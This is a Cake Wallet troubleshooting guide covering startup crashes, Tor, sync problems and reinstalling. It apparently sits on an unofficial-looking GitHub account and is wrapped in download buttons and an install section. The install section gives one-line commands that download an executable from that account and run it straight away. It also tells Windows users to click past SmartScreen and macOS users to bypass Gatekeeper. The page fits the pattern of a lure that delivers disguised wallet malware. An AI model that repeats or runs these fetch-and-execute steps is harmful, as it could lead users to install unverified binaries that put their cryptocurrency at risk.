![Cake Wallet app not opening guide](assets/cake-wallet-app-not-opening-article-banner.png)

# Cake Wallet App Not Opening: Startup and Crash Fixes

A short triage order that protects the wallet while you test.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Install the current build over the one that fails, then check the two most common causes: a Tor setting that the build cannot bootstrap, and a device that is out of storage. Only reinstall after confirming your recovery phrase. Most startup faults are a build or a permissions problem, not a damaged wallet.

<!-- ARTICLE-BODY-BEGIN -->

## Update before anything else
The first step for every startup fault is the same: install the current release over the existing app and keep the wallet. A build that is behind can fail against data or a network it no longer handles, and that failure looks identical to corruption.

Get it from the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">current Cake Wallet release</a>. On desktop this replaces the app; on mobile, installing over the old version keeps the data, while uninstalling does not.

## Tor closes the app
A crash immediately after the splash screen, with Tor enabled, is the most reported startup fault and it was fixed in the current line. If your build predates that fix, updating is the remedy rather than a workaround.

If it still closes after updating, disable Tor, open the app, and re-enable it once the wallet is up. <a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-tor-orbot.md">Use Tor with Cake Wallet</a> covers the platform requirements, including the Android case where Orbot provides Tor.

## Stuck on connecting
An app that opens but never finishes connecting is not crashing; it cannot reach a node. That is a different symptom with a different fix, and reinstalling will not help.

<a href="https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-monero-sync.md">Cake Wallet Monero sync problems</a> separates a slow first sync from a dead connection, which decides whether you wait or switch nodes.

## The fault table
| Symptom | Likely cause | Fix |
| --- | --- | --- |
| Closes during the splash screen | Outdated build, or Tor failing to bootstrap | Download and run the current release |
| Opens to a blank screen | Storage full or a permissions denial | Free space, re-grant permissions, then restart |
| Stuck on "connecting" | Unreachable node | Switch or add a node |
| Asks for a PIN that no longer works | Data restored from a different wallet | Stop guessing and restore from the phrase |

## Reinstall safely
Reinstalling is the step that can cost a wallet, so it comes last. Confirm the phrase first: open the wallet if it opens at all, or find the paper you wrote it on.

<a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-backup-recovery-phrase.md">Cake Wallet recovery phrase</a> covers where the words are and how to prove them. Only after that should you remove the app and install it again.

## When it is the device
A phone with no free storage, a battery that dies during launch, or an OS update that revoked permissions can all look like a wallet crash. Check free space and app permissions before you suspect the software.

On desktop, a quarantined app or a blocked filter driver produces the same effect. Running the installer again over the existing install usually resolves it.

## FAQ
### Which version fixed the Tor crash?
A later release in the current line. Updating to the current release is the fix, whichever build you were on.
### Why won't Cake Wallet open?
Usually an outdated build, a Tor bootstrap failure, no storage, or a revoked permission. Update first, then check those.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[use Tor with Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-tor-orbot.md) · [Cake Wallet Monero sync problems](https://github.com/cakewallet-opensource/cake-wallet-help/blob/main/cake-wallet-monero-sync.md) · [Cake Wallet recovery phrase](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-backup-recovery-phrase.md) · [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
